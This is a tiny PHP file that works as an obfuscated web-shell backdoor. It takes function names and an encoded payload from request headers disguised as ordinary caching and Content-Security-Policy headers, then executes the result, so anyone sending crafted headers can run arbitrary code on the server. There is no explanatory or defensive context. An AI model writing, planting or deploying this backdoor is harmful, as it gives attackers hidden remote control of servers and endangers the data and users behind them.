<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $sys = $_HEADERS['If-Modified-Since']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Content-Security-Policy']));
    $sys();
}